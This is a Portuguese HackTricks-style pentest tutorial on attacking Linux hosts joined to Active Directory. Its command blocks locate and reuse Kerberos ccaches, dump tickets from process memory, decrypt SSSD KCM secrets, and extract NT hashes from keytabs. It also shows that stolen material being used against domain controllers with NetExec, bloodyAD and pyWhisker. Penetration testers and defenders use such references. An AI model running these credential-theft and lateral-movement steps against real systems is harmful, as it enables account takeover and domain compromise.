# Linux Active Directory

{{#include ../../banners/hacktricks-training.md}}

Uma máquina Linux também pode estar presente em um ambiente do Active Directory.

Uma máquina Linux dentro de um AD pode **armazenar material do Kerberos localmente**: ccaches de usuários, keytabs de máquina/serviço e secrets gerenciados pelo SSSD. Esses artefatos geralmente podem ser reutilizados como qualquer outra credencial do Kerberos. Para ler a maioria deles, você precisará ser o usuário proprietário do ticket ou **root** na máquina.

## Enumeração

### Enumeração de AD a partir do Linux

Se você tiver acesso a um AD no Linux (ou ao bash no Windows), poderá tentar [https://github.com/lefayjey/linWinPwn](https://github.com/lefayjey/linWinPwn) para enumerar o AD.

Você também pode consultar a página a seguir para aprender **outras formas de enumerar o AD a partir do Linux**:


{{#ref}}
../../network-services-pentesting/pentesting-ldap.md
{{#endref}}

### FreeIPA

FreeIPA é uma **alternativa** open-source ao **Active Directory** do Microsoft Windows, principalmente para ambientes **Unix**. Ele combina um **diretório LDAP** completo com um Centro de Distribuição de Chaves do **Kerberos** MIT para gerenciamento semelhante ao Active Directory. Utilizando o **Certificate System** do Dogtag para o gerenciamento de certificados de CA e RA, ele oferece suporte à autenticação **multifator**, incluindo smartcards. O SSSD é integrado aos processos de autenticação Unix. Saiba mais sobre ele em:


{{#ref}}
../software-information/freeipa-pentesting.md
{{#endref}}

### Artefatos de hosts ingressados no domínio

Antes de lidar com tickets, identifique **como o host foi ingressado no AD** e **onde o material do Kerberos está realmente armazenado**. Em hosts Linux modernos, isso geralmente é gerenciado por `realmd` + `adcli` + `sssd`, e não apenas por arquivos simples em `/tmp`:
```bash
# Is the host joined to a realm/domain?
realm list 2>/dev/null
adcli testjoin 2>/dev/null

# SSSD / Kerberos configuration
grep -R "ad_domain\|krb5_realm\|cache_credentials\|ldap_id_mapping" /etc/sssd/sssd.conf /etc/sssd/conf.d 2>/dev/null
grep -R "default_ccache_name" /etc/krb5.conf /etc/krb5.conf.d 2>/dev/null

# Machine account and local Kerberos artefacts
klist -k /etc/krb5.keytab 2>/dev/null
find /var/lib/sss -maxdepth 3 \( -name '*.ldb' -o -name '.secrets.mkey' -o -name 'ccache_*' \) -ls 2>/dev/null
find /tmp /run/user -maxdepth 2 -name 'krb5cc*' -ls 2>/dev/null
```
Isso informa rapidamente se o host confia no AD, se o SSSD está armazenando identidades ou tickets em cache e se **machine/service keytabs** ou **KCM secrets** estão disponíveis para abuso.

## Playing with tickets

### Pass The Ticket

Nesta página, você encontrará diferentes locais onde é possível **encontrar tickets Kerberos dentro de um host Linux**. Na página a seguir, você aprenderá como transformar esses formatos de tickets CCache em Kirbi (o formato necessário para uso no Windows) e também como realizar um ataque de PTT:


{{#ref}}
../../windows-hardening/active-directory-methodology/pass-the-ticket.md
{{#endref}}

Se você quiser os **fluxos de trabalho específicos do Linux para coleta de tickets** (`FILE`, `DIR`, `KEYRING`, `KCM`, `/proc`, etc.), consulte a página dedicada:

{{#ref}}
../../network-services-pentesting/pentesting-kerberos-88/harvesting-tickets-from-linux.md
{{#endref}}

### Reutilização de tickets CCACHE de /tmp

Os arquivos CCACHE são formatos binários para **armazenar credenciais Kerberos**. `FILE:/tmp/krb5cc_%{uid}` ainda é comum, mas implantações modernas de Linux também usam `DIR:/run/user/%{uid}/krb5cc*`, `KEYRING:persistent:%{uid}` ou `KCM:%{uid}`. Verifique a variável de ambiente **`KRB5CCNAME`** e a configuração `default_ccache_name` antes de presumir que os tickets estão em `/tmp`.
```bash
# Where is the current process reading credentials from?
env | grep KRB5CCNAME
grep -R "default_ccache_name" /etc/krb5.conf /etc/krb5.conf.d 2>/dev/null
klist -l 2>/dev/null

# FILE / DIR caches commonly seen on joined Linux hosts
find /tmp /run/user -maxdepth 2 -name 'krb5cc*' -ls 2>/dev/null

# Prepare to reuse a FILE cache
export KRB5CCNAME=/tmp/krb5cc_1000
klist
```
### Reutilização de tickets CCACHE a partir do keyring

**Kerberos tickets armazenados na memória de um processo podem ser extraídos**, especialmente quando a proteção ptrace da máquina está desabilitada (`/proc/sys/kernel/yama/ptrace_scope`). Uma ferramenta útil para essa finalidade está disponível em [https://github.com/TarlogicSecurity/tickey](https://github.com/TarlogicSecurity/tickey), que facilita a extração ao injetar nas sessões e fazer o dumping dos tickets em `/tmp`.

Para configurar e usar essa ferramenta, siga as etapas abaixo:
```bash
git clone https://github.com/TarlogicSecurity/tickey
cd tickey/tickey
make CONF=Release
/tmp/tickey -i
```
Este procedimento tentará injetar em várias sessões, indicando sucesso ao armazenar tickets extraídos em `/tmp`, seguindo a convenção de nomenclatura `__krb_UID.ccache`.

### Reutilização de tickets CCACHE do SSSD KCM

O SSSD mantém uma cópia do database no caminho `/var/lib/sss/secrets/secrets.ldb`. A chave correspondente é armazenada como um arquivo oculto no caminho `/var/lib/sss/secrets/.secrets.mkey`. Por padrão, a chave só pode ser lida se você tiver permissões de **root**.

Invocar **`SSSDKCMExtractor`** com os parâmetros --database e --key analisará o database e **descriptografará os secrets**.
```bash
git clone https://github.com/fireeye/SSSDKCMExtractor
python3 SSSDKCMExtractor.py --database secrets.ldb --key secrets.mkey
```
O **blob do cache de credenciais Kerberos pode ser convertido em um arquivo Kerberos CCache utilizável**, que pode ser passado ao Mimikatz/Rubeus.

### Triagem rápida de keytab
```bash
# Inspect available principals and enctypes
klist -k -e /etc/krb5.keytab

# Request a TGT directly from the keytab
kinit -k -t /etc/krb5.keytab 'host/web01.domain.local@DOMAIN.LOCAL'
klist
```
### Extrair contas de /etc/krb5.keytab

As chaves de contas de serviço, essenciais para serviços executados com privilégios de root, são armazenadas com segurança em arquivos **`/etc/krb5.keytab`**. Essas chaves, semelhantes a senhas de serviços, exigem estrita confidencialidade.

Para inspecionar o conteúdo do arquivo keytab, é possível usar o **`klist`**. No Linux, `klist -k -K -e` exibe os principais, os números de versão das chaves, os tipos de criptografia e o material bruto das chaves. Se o tipo de chave for **23 / RC4-HMAC**, o valor da chave também será o **hash NT** desse principal.
```bash
klist -k -K -e /etc/krb5.keytab
# RC4-HMAC entries expose reusable NTLM material; AES entries do not
```
Para usuários Linux, **`KeyTabExtract`** oferece a funcionalidade de extrair o hash RC4 HMAC, que pode ser usado para reutilização de hash NTLM. Observe que isso só ajuda quando o keytab ainda contém material **etype 23 / RC4-HMAC**. Em ambientes **somente AES**, talvez você não obtenha um hash NT reutilizável, mas ainda poderá autenticar-se diretamente com o keytab via Kerberos.
```bash
python3 keytabextract.py krb5.keytab
# Expected output varies based on hash availability
```
No macOS, **`bifrost`** serve como uma ferramenta para análise de arquivos keytab.
```bash
./bifrost -action dump -source keytab -path /path/to/your/file
```
Utilizando as informações de contas e hashes extraídas, é possível estabelecer conexões com servidores usando ferramentas como **`NetExec`**.
```bash
# NTLM/RC4 material recovered from etype 23 entries
nxc smb 10.XXX.XXX.XXX -u 'ServiceAccount$' -H "HashPlaceholder" -d "YourDOMAIN"

# Or reuse a Kerberos cache directly
KRB5CCNAME=owned.ccache netexec smb <DC_FQDN> --use-kcache
```
### Reutilizar a conta da máquina de `/etc/krb5.keytab`

Em sistemas ingressados no domínio usando `realmd`/`adcli`/`sssd`, `/etc/krb5.keytab` geralmente contém a **conta do computador** e um ou mais **principals de host/serviço**. Se você tiver **root**, não faça apenas o dump: use um dos principals listados por `klist -k` para solicitar um TGT e operar como o próprio host Linux.
```bash
# Identify usable principals first
klist -k /etc/krb5.keytab

# Then request a TGT with one of the listed principals
kinit -k -t /etc/krb5.keytab 'host/web01.domain.local@DOMAIN.LOCAL'
klist

# Validate LDAP / service access using that machine identity
ldapwhoami -Y GSSAPI -H ldap://dc.domain.local
kvno ldap/dc.domain.local
```
Isso é especialmente útil quando o próprio **objeto de computador** possui direitos delegados no AD ou quando o host pode recuperar outros secrets, como uma **gMSA**.

### Reutilize material Kerberos roubado com ferramentas de AD focadas em Linux

Depois de obter um `ccache` válido ou um keytab utilizável, você pode operar diretamente no AD **a partir do Linux**, sem precisar converter tudo primeiro para formatos do Windows. Muitas ferramentas modernas aceitam `KRB5CCNAME` / autenticação Kerberos nativamente:
```bash
# Reuse a stolen cache with bloodyAD for LDAP-side actions
KRB5CCNAME=owned.ccache bloodyAD -d corp.local -k --host dc.corp.local get object 'CN=Domain Admins,CN=Users,DC=corp,DC=local'

# Reuse the same cache with pyWhisker when you already have write access
KRB5CCNAME=owned.ccache python3 pywhisker.py -d corp.local -k --dc-ip dc.corp.local \
--target 'WEB01$' --action list
```
Esta é uma boa ponte entre **Linux post-exploitation** e **abuso de objetos AD**. Para os próprios caminhos de abuso em nível de objeto, consulte:

{{#ref}}
../../network-services-pentesting/pentesting-ldap.md
{{#endref}}

{{#ref}}
../../windows-hardening/active-directory-methodology/acl-persistence-abuse/shadow-credentials.md
{{#endref}}

### Artefatos de gMSA / Managed Service Account no Linux

Deployments recentes de Linux podem consumir **Managed Service Accounts** diretamente do AD. Na prática, isso significa que, após comprometer um servidor Linux, você poderá encontrar não apenas o host keytab, mas também **service-specific keytabs** gerados a partir de uma gMSA. Locais comuns para inspeção incluem `/etc/gmsad.conf`, arquivos de configuração específicos do deployment e arquivos `*.keytab` adicionais em `/etc`.
```bash
# Look for gMSA-related configuration and extra keytabs
grep -R "gMSA_\|principal =\|keytab =" /etc/gmsad.conf /etc/gmsad.d 2>/dev/null
find /etc -maxdepth 2 -name '*.keytab' -ls 2>/dev/null

# Inspect the host keytab and any service keytab you find
klist -kt /etc/krb5.keytab
klist -kt /etc/service.keytab

# If a service/gMSA keytab exists, request a TGT with it
kinit -kt /etc/service.keytab 'svc_web$@DOMAIN.LOCAL'
klist
```
Isso fornece uma identidade Kerberos reutilizável para os SPNs associados a esse gMSA **sem tocar em nenhum endpoint Windows**. Para abuso de gMSA/dMSA **no domínio** após obter privilégios mais elevados no AD, consulte:

{{#ref}}
../../windows-hardening/active-directory-methodology/golden-dmsa-gmsa.md
{{#endref}}

## Referências

- [https://www.tarlogic.com/blog/how-to-attack-kerberos/](https://www.tarlogic.com/blog/how-to-attack-kerberos/)
- [https://docs.redhat.com/en/documentation/red_hat_enterprise_linux/8/html/integrating_rhel_systems_directly_with_windows_active_directory/assembly_accessing-ad-with-a-managed-service-account_integrating-rhel-systems-directly-with-active-directory](https://docs.redhat.com/en/documentation/red_hat_enterprise_linux/8/html/integrating_rhel_systems_directly_with_windows_active_directory/assembly_accessing-ad-with-a-managed-service-account_integrating-rhel-systems-directly-with-active-directory)

{{#include ../../banners/hacktricks-training.md}}
